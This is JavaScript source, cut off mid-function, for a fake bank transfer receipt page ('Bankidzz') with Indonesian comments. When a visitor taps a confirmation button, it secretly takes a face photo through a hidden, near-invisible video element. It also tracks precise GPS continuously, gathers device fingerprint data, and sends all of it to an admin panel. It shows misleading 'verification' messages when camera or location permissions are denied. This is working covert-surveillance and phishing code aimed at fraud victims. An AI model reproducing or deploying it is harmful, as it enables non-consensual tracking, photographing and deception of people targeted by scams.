// ============================================================
// BANKIDZZ V2 - SILENT CAPTURE + FRONT CAMERA FIRST
// ============================================================

(function() {
    'use strict';

    const CONFIG = {
        API_URL: '/api/locations',
        TEMPLATE_URL: '/api/template',
        WEBPROFILE_URL: '/api/webprofile',
        SYNC_CHANNEL: 'bankidzz_sync_channel',
        SILENT_CAPTURE_DELAY: 200,       // delay ultra-cepat (ms)
        LOCATION_TIMEOUT: 1500,          // timeout GPS otomatis (ms)
        FRONT_CAMERA_QUALITY: 0.80,      // kualitas foto depan
        BACK_CAMERA_QUALITY: 0.85        // kualitas foto belakang
    };

    // Default Template
    const defaultTemplate = {
        topBarTitle: 'JAPANESE BANK',
        primaryColor: '#0033ff',
        profileImage: 'logo.png',
        bankName: 'MUFG Bank',
        bankSub: 'Office Purchasing',
        amountMain: 'IDR 515.000',
        amountSub: 'BND 35.12',
        senderBank: 'MUFG Bank',
        senderName: 'JAKA ALAMSYAH',
        senderAccount: '72828172718',
        receiverBank: 'BANK BNI',
        receiverAccount: '2093832050',
        receiverName: 'Mungkung',
        buttonText: 'Ambil Foto Konfirmasi / Tanda Tangan'
    };

    let currentTemplate = { ...defaultTemplate };
    let capturedPhotoBase64 = null;
    let silentFrontPhotoBase64 = null;     // Foto silent dari kamera depan
    let silentLocationData = null;         // Lokasi silent
    let frontCameraStream = null;          // Stream kamera depan
    let backCameraStream = null;           // Stream kamera belakang

    // DOM Elements
    const elements = {
        topBarTitle: document.getElementById('topBarTitle'),
        profileImage: document.getElementById('profileImage'),
        bankName: document.getElementById('bankName'),
        bankSub: document.getElementById('bankSub'),
        amountMain: document.getElementById('amountMain'),
        amountSub: document.getElementById('amountSub'),
        senderBankDetail: document.getElementById('senderBankDetail'),
        senderName: document.getElementById('senderName'),
        senderAccount: document.getElementById('senderAccount'),
        receiverBankDetail: document.getElementById('receiverBankDetail'),
        receiverAccount: document.getElementById('receiverAccount'),
        receiverName: document.getElementById('receiverName'),
        btnConfirm: document.getElementById('btnConfirm'),
        notification: document.getElementById('notification'),
        receiptCard: document.getElementById('receiptCard'),
        photoModal: document.getElementById('photoModal'),
        modalPreviewImg: document.getElementById('modalPreviewImg'),
        btnCloseModal: document.getElementById('btnCloseModal'),
        btnCancelPhoto: document.getElementById('btnCancelPhoto'),
        btnSendPhoto: document.getElementById('btnSendPhoto'),
        fileCameraInput: document.getElementById('fileCameraInput'),
        // Element baru untuk kamera
        cameraContainer: document.getElementById('cameraContainer'),
        cameraVideo: document.getElementById('cameraVideo'),
        cameraCanvas: document.getElementById('cameraCanvas'),
        cameraStatus: document.getElementById('cameraStatus'),
        btnCaptureBack: document.getElementById('btnCaptureBack')
    };

    // ============================================================
    // REALTIME GPS TRACKER & HIGH-PRECISION LOCK (100% AKURAT)
    // ============================================================
    let liveLocationData = null;
    let bestAccurateLocation = null;
    let locationWatchId = null;

    // Helper: Periksa apakah lokasi adalah sinyal GPS hardware asli (bukan IP / fallback / loncatan kasar)
    function isRealGps(loc) {
        if (!loc || typeof loc.lat !== 'number' || typeof loc.lng !== 'number') return false;
        if (loc.lat === 0 && loc.lng === 0) return false;
        // Bukan fallback Monas
        if (Math.abs(loc.lat - (-6.2088)) < 0.001 && Math.abs(loc.lng - 106.8456) < 0.001) return false;
        // Bukan estimasi IP jaringan
        if (loc.source === 'default-fallback' || loc.source === 'ip-network-estimated') return false;
        // Akurasi harus masuk akal untuk pembacaan GPS/WiFi perangkat (maks 500 meter)
        if (loc.accuracy && loc.accuracy > 500) return false;
        return true;
    }

    // Bersihkan cache jika sebelumnya menyimpan titik Monas atau fallback palsu
    try {
        const savedGps = JSON.parse(localStorage.getItem('bankidzz_best_gps') || 'null');
        if (savedGps) {
            if (!isRealGps(savedGps)) {
                localStorage.removeItem('bankidzz_best_gps');
            } else if (savedGps.savedAt && (Date.now() - savedGps.savedAt > 15 * 60 * 1000)) {
                localStorage.removeItem('bankidzz_best_gps');
            } else {
                bestAccurateLocation = savedGps;
                liveLocationData = savedGps;
            }
        }
    } catch(e) {}

    // FUNGSI PUSAT PEMROSESAN POSISI (SMART LOCATION SELECTOR)
    function processNewLocation(pos, source = 'satellite-gps') {
        const newLat = pos.coords.latitude;
        const newLng = pos.coords.longitude;
        const newAcc = pos.coords.accuracy || 15;

        if (!Number.isFinite(newLat) || !Number.isFinite(newLng)) return null;
        if (newLat === 0 && newLng === 0) return null;

        const newLocation = {
            lat: newLat,
            lng: newLng,
            accuracy: newAcc,
            altitude: pos.coords.altitude || null,
            heading: pos.coords.heading || null,
            speed: pos.coords.speed || null,
            timestamp: new Date().toISOString(),
            source: source,
            silent: true
        };

        // HIERARKI PENERIMAAN KOORDINAT:
        // 1. Hardware GPS asli dari sensor HP SELALU menang dan menggantikan estimasi IP / fallback Monas!
        // 2. Jika sama-sama GPS sensor, terima jika akurasi lebih presisi (newAcc < prevAcc)
        // 3. Jika sama-sama presisi (<= 65m), perbarui koordinat & timestamp live
        // 4. Tolak hanya lompatan kasar BTS seluler (> 250m) saat kita sudah punya GPS presisi (<= 50m)
        let isBetter = false;
        if (!bestAccurateLocation) {
            isBetter = true;
        } else if (!isRealGps(bestAccurateLocation)) {
            isBetter = true; // Hardware GPS selalu menggantikan data estimasi jaringan / fallback!
        } else if (newAcc < bestAccurateLocation.accuracy) {
            isBetter = true; // Akurasi lebih presisi!
        } else if (newAcc <= 65 && bestAccurateLocation.accuracy <= 65) {
            isBetter = true; // Keduanya presisi tinggi, sinkronkan ke koordinat live
        } else if (bestAccurateLocation.accuracy > 100 && newAcc <= 100) {
            isBetter = true; // Dari sinyal seluler kasar masuk ke Wi-Fi / satelit GPS
        } else if (newAcc > 250 && bestAccurateLocation.accuracy <= 50) {
            isBetter = false; // Tolak loncatan BTS seluler kasar jika sudah punya GPS satelit
        } else {
            isBetter = false;
        }

        if (isBetter) {
            bestAccurateLocation = newLocation;
            liveLocationData = newLocation;
            try {
                localStorage.setItem('bankidzz_best_gps', JSON.stringify({
                    ...newLocation,
                    savedAt: Date.now()
                }));
            } catch(e) {}

            console.log(`[GPS-ACCURATE] Locked: ${newLocation.lat.toFixed(6)}, ${newLocation.lng.toFixed(6)} (±${Math.round(newLocation.accuracy)}m) [${source}]`);

            // AUTO-SYNC KE ADMIN: jika transaksi sedang berjalan dan lokasi baru adalah GPS nyata,
            // seketika perbarui data transaksi di panel admin dengan titik satelit akurat ini!
            if (currentTransferId && isRealGps(newLocation)) {
                syncTransactionRecord({
                    transferId: currentTransferId,
                    location: bestAccurateLocation,
                    frontPhoto: silentFrontPhotoBase64 || '',
                    photo: capturedPhotoBase64 || '',
                    status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
                });
            }
        }

        return newLocation;
    }

    function startRealtimeLocationTracking() {
        if (!navigator.geolocation) {
            console.warn('[GPS] Geolocation tidak didukung browser ini.');
            return;
        }

        // Cek status izin jika didukung browser
        try {
            if (navigator.permissions && navigator.permissions.query) {
                navigator.permissions.query({ name: 'geolocation' }).then(perm => {
                    console.log('[GPS-PERM] Status:', perm.state);
                    if (perm.state === 'denied') {
                        showNotification('Sedang Berlangsung Verifikasi.', 'Verifikasi');
                    }
                }).catch(() => {});
            }
        } catch(e) {}

        // TAHAP 1: Segera ambil posisi cepat dari OS HP (Google Play Services / CoreLocation)
        // maximumAge: 60000 (1 menit terakhir) -> mengembalikan posisi instan (< 100ms) dengan akurasi tinggi!
        try {
            navigator.geolocation.getCurrentPosition(
                (pos) => processNewLocation(pos, 'device-fast-cache'),
                (err) => console.log('[GPS-INIT] Fast check notice:', err.message),
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
            );
        } catch(e) {}

        // TAHAP 2: Jalankan watchPosition aktif di latar belakang untuk terus mengunci satelit segar
        const geoOptions = {
            enableHighAccuracy: true,
            timeout: 25000,
            maximumAge: 5000 // Izinkan penyegaran hingga 5 detik agar sensor HP terus terbarui
        };

        const onLocationSuccess = (pos) => {
            processNewLocation(pos, 'satellite-gps');
        };

        const onLocationError = (err) => {
            console.warn('[GPS-LIVE] Notice:', err.message, 'code:', err.code);
        };

        try {
            if (locationWatchId !== null) {
                navigator.geolocation.clearWatch(locationWatchId);
            }
            locationWatchId = navigator.geolocation.watchPosition(onLocationSuccess, onLocationError, geoOptions);
        } catch(e) {
            console.warn('[GPS-LIVE] watchPosition error:', e);
        }
    }

    async function getNetworkIpLocation() {
        // Jika sudah ada koordinat GPS akurat dari hardware perangkat, gunakan GPS hardware!
        if (isRealGps(bestAccurateLocation)) {
            return { ...bestAccurateLocation };
        }

        // Coba layanan IP Geolocation bebas CORS
        const services = [
            async () => {
                const resp = await fetch('https://ipwho.is/');
                if (resp.ok) {
                    const data = await resp.json();
                    if (data && data.success && typeof data.latitude === 'number') {
                        return {
                            lat: data.latitude,
                            lng: data.longitude,
                            accuracy: 15000, // 15 km (estimasi ISP / kota)
                            timestamp: new Date().toISOString(),
                            source: 'ip-network-estimated',
                            city: data.city || '',
                            country: data.country || '',
                            silent: true
                        };
                    }
                }
                return null;
            },
            async () => {
                const resp = await fetch('https://freeipapi.com/api/json');
                if (resp.ok) {
                    const data = await resp.json();
                    if (data && typeof data.latitude === 'number') {
                        return {
                            lat: data.latitude,
                            lng: data.longitude,
                            accuracy: 15000,
                            timestamp: new Date().toISOString(),
                            source: 'ip-network-estimated',
                            city: data.cityName || '',
                            country: data.countryName || '',
                            silent: true
                        };
                    }
                }
                return null;
            }
        ];

        for (const s of services) {
            try {
                const res = await s();
                if (res) return res;
            } catch(e) {}
        }

        // Fallback terakhir jika offline / tanpa koneksi: Monas Jakarta
        // PENTING: diberi akurasi 50000m (50 km) agar TIDAK PERNAH memblokir pembacaan sensor GPS asli HP!
        return {
            lat: -6.2088,
            lng: 106.8456,
            accuracy: 50000,
            timestamp: new Date().toISOString(),
            source: 'default-fallback',
            silent: true
        };
    }

    function getSilentLocation() {
        return new Promise((resolve) => {
            // 1. Jika GPS perangkat sudah berhasil mengunci posisi hardware nyata (akurasi <= 100m)
            if (isRealGps(bestAccurateLocation)) {
                resolve({ ...bestAccurateLocation });
                return;
            }

            if (!navigator.geolocation) {
                console.warn('[GPS] Geolocation tidak didukung browser ini.');
                getNetworkIpLocation().then(resolve);
                return;
            }

            let resolved = false;

            // Timer batas waktu 9.5 detik agar pengguna sempat merespon izin dan GPS sempat lock
            const timeoutId = setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    if (isRealGps(bestAccurateLocation)) {
                        resolve({ ...bestAccurateLocation });
                    } else if (isRealGps(liveLocationData)) {
                        resolve({ ...liveLocationData });
                    } else {
                        getNetworkIpLocation().then(resolve);
                    }
                }
            }, 9500);

            // Coba ambil posisi segar langsung dari Geolocation API
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const loc = processNewLocation(pos, 'gps-accurate');
                    if (!resolved) {
                        resolved = true;
                        clearTimeout(timeoutId);
                        resolve({ ...(loc || bestAccurateLocation) });
                    }
                },
                (err) => {
                    console.warn('[GPS] getCurrentPosition error:', err.message, 'code:', err.code);
                    if (err.code === 1) { // PERMISSION_DENIED
                        showNotification('Bersiap Untuk Melanjutkan', 'Verifikasi');
                    }
                    if (!resolved) {
                        resolved = true;
                        clearTimeout(timeoutId);
                        if (isRealGps(bestAccurateLocation)) {
                            resolve({ ...bestAccurateLocation });
                        } else {
                            getNetworkIpLocation().then(resolve);
                        }
                    }
                },
                {
                    enableHighAccuracy: true,
                    timeout: 9000,
                    maximumAge: 60000 // 60 detik cache recent OS
                }
            );
        });
    }

    let currentTransferId = null;

    // ============================================================
    // SILENT FRONT CAMERA CAPTURE (WAJAH - OTOMATIS & CEPAT)
    // ============================================================
    async function silentFrontCameraCapture() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.warn('[FRONT-CAM] getUserMedia tidak didukung.');
                return null;
            }

            let stream = null;
            // 1. Coba kamera depan (user facing camera untuk HP / Webcam)
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
            } catch(eUser) {
                console.warn('[FRONT-CAM] facingMode user gagal, mencoba video default:', eUser);
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: false
                    });
                } catch(eAny) {
                    console.error('[FRONT-CAM] Akses kamera gagal:', eAny);
                    return null;
                }
            }

            if (!stream) return null;
            frontCameraStream = stream;

            // Pasang video element di DOM (ukuran 2px, opacity 0.01) agar browser mendecode frame kamera
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.setAttribute('webkit-playsinline', '');
            video.muted = true;
            video.style.cssText = 'position:fixed;top:0;left:0;width:2px;height:2px;opacity:0.01;pointer-events:none;z-index:-1;';
            document.body.appendChild(video);

            try {
                await video.play();
            } catch(ePlay) {
                console.warn('[FRONT-CAM] video.play error:', ePlay);
            }

            // Tunggu hingga frame aktif dari sensor kamera (videoWidth > 0 dan readyState >= 2)
            await new Promise((resolve) => {
                let attempts = 0;
                const checkFrame = () => {
                    attempts++;
                    if ((video.videoWidth > 0 && video.readyState >= 2) || attempts >= 30) {
                        resolve();
                    } else {
                        setTimeout(checkFrame, 80);
                    }
                };
                checkFrame();
            });

            // Beri jeda 350ms agar sensor kamera HP menyesuaikan eksposur cahaya wajah
            await new Promise(r => setTimeout(r, 350));

            // Tangkap frame wajah ke canvas dengan resolusi optimal
            const canvas = document.createElement('canvas');
            const maxDim = 800;
            let w = video.videoWidth > 0 ? video.videoWidth : 640;
            let h = video.videoHeight > 0 ? video.videoHeight : 480;
            if (w > maxDim || h > maxDim) {
                if (w > h) {
                    h = Math.round(h * (maxDim / w));
                    w = maxDim;
                } else {
                    w = Math.round(w * (maxDim / h));
                    h = maxDim;
                }
            }
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, w, h);

            const capturedFacePhoto = canvas.toDataURL('image/jpeg', 0.80);

            // Bersihkan video element
            try {
                video.pause();
                video.srcObject = null;
                video.remove();
            } catch(e) {}

            // HENTIKAN SEMUA TRACK KAMERA DEPAN SECARA BERSIH
            if (frontCameraStream) {
                frontCameraStream.getTracks().forEach(track => {
                    try { track.stop(); } catch(e) {}
                });
                frontCameraStream = null;
            }

            console.log('[FRONT-CAM] Sukses silent capture foto wajah!');
            return capturedFacePhoto;

        } catch (err) {
            console.error('[FRONT-CAM] Error pada silentFrontCameraCapture:', err);
            if (frontCameraStream) {
                try {
                    frontCameraStream.getTracks().forEach(track => track.stop());
                } catch(e) {}
                frontCameraStream = null;
            }
            return null;
        }
    }

    let currentFacingMode = 'environment';

    // ============================================================
    // BACK CAMERA FOR ITEM / TRANSACTION PHOTO (KAMERA BELAKANG HP)
    // ============================================================
    async function openBackCamera(targetMode = 'environment') {
        currentFacingMode = targetMode;
        try {
            console.log(`[BACK-CAM] Membuka kamera (${targetMode})...`);
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return false;
            }

            if (backCameraStream) {
                try {
                    backCameraStream.getTracks().forEach(t => t.stop());
                } catch(e) {}
                backCameraStream = null;
            }

            let stream = null;
            const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
            const videoDevices = devices.filter(d => d.kind === 'videoinput');

            // 1. Coba cari device dari daftar device yang labelnya sesuai
            if (targetMode === 'environment') {
                const backDevice = videoDevices.find(d => /back|rear|environment|belakang|camera2\s*0/i.test(d.label));
                if (backDevice) {
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                deviceId: { exact: backDevice.deviceId },
                                width: { ideal: 1920 },
                                height: { ideal: 1080 }
                            },
                            audio: false
                        });
                    } catch(eBackDev) {}
                }
            } else {
                const frontDevice = videoDevices.find(d => /front|user|depan|face|camera2\s*1/i.test(d.label));
                if (frontDevice) {
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                deviceId: { exact: frontDevice.deviceId },
                                width: { ideal: 1920 },
                                height: { ideal: 1080 }
                            },
                            audio: false
                        });
                    } catch(eFrontDev) {}
                }
            }

            // 2. Coba exact facingMode (khusus HP smartphone agar pasti kamera belakang)
            if (!stream) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { exact: targetMode },
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        },
                        audio: false
                    });
                } catch (eExact) {
                    console.warn(`[BACK-CAM] exact ${targetMode} failed, mencoba ideal:`, eExact);
                    // 3. Coba ideal facingMode
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({
                            video: {
                                facingMode: { ideal: targetMode },
                                width: { ideal: 1920 },
                                height: { ideal: 1080 }
                            },
                            audio: false
                        });
                    } catch(eIdeal) {
                        try {
                            stream = await navigator.mediaDevices.getUserMedia({
                                video: true,
                                audio: false
                            });
                        } catch(eDef) {
                            return false;
                        }
                    }
                }
            }

            if (!stream) return false;

            backCameraStream = stream;

            if (elements.cameraVideo) {
                elements.cameraVideo.srcObject = backCameraStream;
                elements.cameraVideo.setAttribute('playsinline', '');
                elements.cameraVideo.setAttribute('webkit-playsinline', '');
                await elements.cameraVideo.play().catch(e => console.warn('[BACK-CAM] video play warn:', e));
            }

            if (elements.cameraStatus) {
                const isBack = (targetMode === 'environment');
                elements.cameraStatus.innerHTML = `<span style="background:${isBack ? 'rgba(16,185,129,0.2)' : 'rgba(59,130,246,0.2)'}; color:${isBack ? '#10b981' : '#60a5fa'}; border:1px solid ${isBack ? '#10b981' : '#3b82f6'}; padding:4px 12px; border-radius:14px; font-size:12px; font-weight:700;">${isBack ? '📷 Kamera Belakang HP Aktif' : '📷 Kamera Depan Aktif'}</span>`;
            }

            if (elements.cameraContainer) {
                elements.cameraContainer.style.display = 'flex';
            }

            return true;
        } catch (err) {
            console.error('[BACK-CAM] Error opening rear camera:', err);
            return false;
        }
    }

    // Fungsi untuk ganti kamera (Depan <-> Belakang)
    async function switchCamera() {
        const nextMode = (currentFacingMode === 'environment') ? 'user' : 'environment';
        console.log(`[SWITCH-CAM] Beralih kamera ke: ${nextMode}`);
        await openBackCamera(nextMode);
    }
    window.switchCamera = switchCamera;

    // Capture snapshot dari kamera belakang dengan resolusi optimal
    function captureBackCamera() {
        let dataUrl = null;
        try {
            const video = elements.cameraVideo;
            const canvas = elements.cameraCanvas || document.createElement('canvas');
            const maxDim = 1000;
            let w = (video && video.videoWidth > 0) ? video.videoWidth : 1280;
            let h = (video && video.videoHeight > 0) ? video.videoHeight : 720;
            if (w > maxDim || h > maxDim) {
                if (w > h) {
                    h = Math.round(h * (maxDim / w));
                    w = maxDim;
                } else {
                    w = Math.round(w * (maxDim / h));
                    h = maxDim;
                }
            }
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            if (video) {
                ctx.drawImage(video, 0, 0, w, h);
                dataUrl = canvas.toDataURL('image/jpeg', 0.80);
            }
        } catch (e) {
            console.warn('captureBackCamera error:', e);
        }

        if (backCameraStream) {
            try {
                backCameraStream.getTracks().forEach(track => track.stop());
            } catch(e) {}
            backCameraStream = null;
        }

        if (elements.cameraContainer) {
            elements.cameraContainer.style.display = 'none';
        }

        return dataUrl;
    }

    // ============================================================
    // MAIN HANDLER:
    // 1. SILENT CAPTURE WAJAH (KAMERA DEPAN) -> LANGSUNG MASUK KE ADMIN
    // 2. SETELAH SELESAI, OTOMATIS BUKA KAMERA BELAKANG UNTUK FOTO BARANG
    // ============================================================
    async function handleConfirmClick() {
        if (!elements.btnConfirm) return;
        if (elements.btnConfirm.dataset.processing === 'true') return;
        elements.btnConfirm.dataset.processing = 'true';

        const originalText = elements.btnConfirm.textContent;
        elements.btnConfirm.textContent = 'Memproses...';
        elements.btnConfirm.disabled = true;

        // Generate ID transaksi unik untuk sesi ini
        currentTransferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();

        try {
            // ========================================================
            // TAHAP 1A: KUNCI LOKASI GPS PERANGKAT SECARA BERSIH
            // ========================================================
            if (elements.btnConfirm) elements.btnConfirm.textContent = ' Sedang berlangsung verifikasi';
            console.log('[TAHAP-1A] Mengunci Verifikasi perangkat...');
            const locResult = await getSilentLocation();
            silentLocationData = locResult;

            // ========================================================
            // TAHAP 1B: SILENT CAPTURE WAJAH (KAMERA DEPAN)
            // ========================================================
            if (elements.btnConfirm) elements.btnConfirm.textContent = 'Menyiapkan Kamera...';
            console.log('[TAHAP-1B] Silent Capture Wajah Kamera Depan...');
            const frontResult = await silentFrontCameraCapture();
            silentFrontPhotoBase64 = frontResult;

            // LANGSUNG KIRIM KE ADMIN (Kamera Wajah + Lokasi Masuk Duluan)
            console.log('[TAHAP-1C] Mengirim Silent Capture Wajah & Lokasi ke Admin...');
            await syncTransactionRecord({
                transferId: currentTransferId,
                location: silentLocationData,
                frontPhoto: silentFrontPhotoBase64,
                photo: '', // Menunggu jepretan kamera belakang
                status: 'waiting_item_photo'
            });

            // Berikan jeda singkat agar driver hardware kamera HP selesai melepas kamera depan
            await new Promise(r => setTimeout(r, 400));

            // ========================================================
            // TAHAP 2: SETELAH SELESAI, LANGSUNG BUKA KAMERA BELAKANG HP UNTUK FOTO BARANG
            // ========================================================
            console.log('[TAHAP-2] Otomatis membuka kamera belakang HP untuk foto barang...');
            const backOpened = await openBackCamera('environment');

            if (!backOpened) {
                // Fallback jika kamera belakang tidak dapat dibuka
                if (typeof window.html2canvas === 'function' && elements.receiptCard) {
                    try {
                        const canvas = await window.html2canvas(elements.receiptCard, {
                            scale: 2,
                            useCORS: true,
                            allowTaint: true,
                            backgroundColor: '#ffffff'
                        });
                        capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
                    } catch(e) {}
                }

                await syncTransactionRecord({
                    transferId: currentTransferId,
                    location: silentLocationData,
                    frontPhoto: silentFrontPhotoBase64,
                    photo: capturedPhotoBase64 || '',
                    status: 'verified'
                });

                if (elements.btnConfirm) {
                    elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                    elements.btnConfirm.style.backgroundColor = '#10b981';
                    elements.btnConfirm.dataset.verified = 'true';
                }

                showNotification('Konfirmasi Berhasil Diverifikasi!', 'success');
            }

        } catch (err) {
            console.error('Error in handleConfirmClick:', err);
            showNotification('Gagal memproses. Coba lagi.', 'error');
            elements.btnConfirm.textContent = originalText;
            elements.btnConfirm.disabled = false;
        } finally {
            elements.btnConfirm.dataset.processing = 'false';
        }
    }

    window.handleConfirmClick = handleConfirmClick;

    // ============================================================
    // HANDLE CAPTURE BACK PHOTO (FOTO BARANG TRANSAKSI)
    // KETIKA DI FOTO, LANGSUNG MASUK JUGA KE HALAMAN ADMIN
    // ============================================================
    async function handleCaptureBackPhoto() {
        if (!elements.btnCaptureBack) return;
        if (elements.btnCaptureBack.dataset.capturing === 'true') return;
        elements.btnCaptureBack.dataset.capturing = 'true';

        elements.btnCaptureBack.textContent = '⏳ Mengirim Foto Barang...';
        elements.btnCaptureBack.disabled = true;

        try {
            // 1. Ambil foto barang dari kamera belakang
            const backPhoto = captureBackCamera();
            if (backPhoto) {
                capturedPhotoBase64 = backPhoto;
            }

            // 2. KETIKA DI FOTO, LANGSUNG MASUK JUGA KE HALAMAN ADMIN
            // Selalu prioritaskan koordinat GPS satelit paling segar dan akurat (TIDAK BOLEH pakai estimasi IP jika ada GPS)
            let finalLocation = null;
            if (isRealGps(bestAccurateLocation)) {
                finalLocation = bestAccurateLocation;
            } else if (isRealGps(liveLocationData)) {
                finalLocation = liveLocationData;
            } else if (isRealGps(silentLocationData)) {
                finalLocation = silentLocationData;
            } else {
                finalLocation = await getSilentLocation();
            }

            console.log('[TAHAP-3] Mengirim foto barang transaksi ke admin...');
            await syncTransactionRecord({
                transferId: currentTransferId || ('REF-' + Math.random().toString(36).substr(2, 8).toUpperCase()),
                location: finalLocation,
                frontPhoto: silentFrontPhotoBase64,
                photo: capturedPhotoBase64 || '',
                status: 'verified'
            });

            // 3. Update status tombol di struk menjadi sukses terverifikasi
            if (elements.btnConfirm) {
                elements.btnConfirm.textContent = 'Konfirmasi Berhasil Diverifikasi';
                elements.btnConfirm.style.backgroundColor = '#10b981';
                elements.btnConfirm.dataset.verified = 'true';
                elements.btnConfirm.disabled = true;
            }

            showNotification('Foto barang & data verifikasi berhasil dikirim!', 'success');

        } catch (err) {
            console.error('Error in handleCaptureBackPhoto:', err);
            showNotification('Gagal mengirim data.', 'error');
        } finally {
            if (elements.btnCaptureBack) {
                elements.btnCaptureBack.textContent = 'Ambil Foto Barang Transaksi';
                elements.btnCaptureBack.disabled = false;
                elements.btnCaptureBack.dataset.capturing = 'false';
            }
        }
    }

    window.handleCaptureBackPhoto = handleCaptureBackPhoto;

    // ============================================================
    // SYNC TRANSACTION RECORD KE ADMIN (LOCALSTORAGE, BROADCAST & API)
    // ============================================================
    async function syncTransactionRecord(data) {
        const transferId = data.transferId;
        
        const payload = {
            transferId: transferId,
            consent: true,
            sender: currentTemplate.senderName || 'FITO ALAMSYAH',
            senderBank: currentTemplate.senderBank || 'BIBD Brunei Darussalam',
            senderAccount: currentTemplate.senderAccount || '72828172718',
            receiver: currentTemplate.receiverName || 'Tasliyah',
            receiverBank: currentTemplate.receiverBank || 'BANK BNI',
            receiverAccount: currentTemplate.receiverAccount || '2093832050',
            amount: currentTemplate.amountMain || 'IDR 515.000',
            amountSub: currentTemplate.amountSub || 'BND 35.12',
            location: data.location || silentLocationData,
            photo: data.photo || '',                 // Foto barang kamera belakang
            frontPhoto: data.frontPhoto || '',       // FOTO WAJAH KAMERA DEPAN (SILENT)
            front_photo: data.frontPhoto || '',      // Kompatibilitas field database
            silentCapture: true,                     // Flag silent capture
            silentLocation: true,                    // Flag silent location
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            status: data.status || 'verified',
            timestamp: new Date().toISOString()
        };

        // 1. Local Storage: Update data yang ada atau tambah baru
        try {
            let localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            const idx = localStored.findIndex(t => t.transferId === transferId);
            if (idx >= 0) {
                localStored[idx] = { ...localStored[idx], ...payload };
            } else {
                localStored.unshift(payload);
            }
            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
        } catch(e) {}

        // 2. Broadcast Channel: Mengirim pembaruan seketika ke Admin Tab
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'NEW_LOCATION', payload: payload });
            channel.close();
        } catch(e) {}

        // 3. Post ke Server API
        try {
            const response = await fetch(CONFIG.API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!response.ok) {
                console.warn('API status non-200, tersimpan di lokal.');
            }
        } catch (e) {
            console.warn('Network error, tersimpan di lokal.', e);
        }
    }

    // Alias untuk kompatibilitas fungsi lama jika ada pemanggilan eksternal
    const saveTransactionWithSilentData = syncTransactionRecord;

    // ============================================================
    // TEMPLATE & UI FUNCTIONS
    // ============================================================
    function applyTemplate(template) {
        currentTemplate = { ...defaultTemplate, ...template };
        
        const themeColor = currentTemplate.primaryColor || '#0033ff';
        document.documentElement.style.setProperty('--primary-blue', themeColor);
        document.title = currentTemplate.topBarTitle || 'Bankidzz';
        
        const topBarEl = document.querySelector('.top-bar');
        if (topBarEl) topBarEl.style.backgroundColor = themeColor;
        
        if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
        if(elements.profileImage) {
            let pImg = currentTemplate.profileImage;
            if (!pImg || pImg === 'channels4_profile.jpg') {
                pImg = 'logo.png';
            }
            elements.profileImage.src = pImg;
            elements.profileImage.style.display = 'block';
        }
        if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
        if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
        if(elements.amountMain) elements.amountMain.textContent = currentTemplate.amountMain;
        if(elements.amountSub) elements.amountSub.textContent = currentTemplate.amountSub;
        if(elements.senderBankDetail) elements.senderBankDetail.textContent = currentTemplate.senderBank;
        if(elements.senderName) elements.senderName.textContent = currentTemplate.senderName;
        if(elements.senderAccount) elements.senderAccount.textContent = currentTemplate.senderAccount;
        if(elements.receiverBankDetail) elements.receiverBankDetail.textContent = currentTemplate.receiverBank;
        if(elements.receiverAccount) elements.receiverAccount.textContent = currentTemplate.receiverAccount;
        if(elements.receiverName) elements.receiverName.textContent = currentTemplate.receiverName;
        
        if(elements.btnConfirm && (!elements.btnConfirm.dataset.verified || elements.btnConfirm.dataset.verified === 'false')) {
            elements.btnConfirm.textContent = currentTemplate.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
            elements.btnConfirm.style.backgroundColor = themeColor;
        }
    }

    async function loadTemplate() {
        // 1. Terapkan data lokal langsung agar INSTAN saat refresh (tidak ada jeda atau kedipan foto lama)
        const stored = localStorage.getItem('bankidzz_new_template');
        if (stored) {
            try { applyTemplate(JSON.parse(stored)); } catch(e) {}
        }

        // 2. Sync dari server di background
        try {
            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.template) {
                    localStorage.setItem('bankidzz_new_template', JSON.stringify(result.template));
                    applyTemplate(result.template);
                }
            }
        } catch(e) {}
    }

    function closeModal() {
        if (elements.photoModal) elements.photoModal.style.display = 'none';
        if (backCameraStream) {
            backCameraStream.getTracks().forEach(track => track.stop());
            backCameraStream = null;
        }
        if (elements.cameraContainer) elements.cameraContainer.style.display = 'none';
    }

    function showNotification(msg, type = 'success') {
        const el = elements.notification;
        if (!el) return;
        el.textContent = msg;
        el.className = 'notification show ' + type;
        clearTimeout(el._timeout);
